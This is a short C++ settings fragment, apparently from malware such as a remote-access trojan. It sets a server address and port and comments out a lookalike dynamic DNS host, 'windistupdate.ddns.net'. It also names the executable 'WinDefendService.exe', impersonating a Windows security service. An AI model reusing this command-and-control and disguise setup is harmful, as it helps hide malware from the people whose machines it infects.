...
std::string Settings::serverIP = "127.0.0.1";	/*windistupdate.ddns.net*/	//server ip
int Settings::serverPort = 8443;	//server port

std::string Settings::fileName = "WinDefendService.exe";					//file name
std::string Settings::folderName = "";					//name of folder where file is located
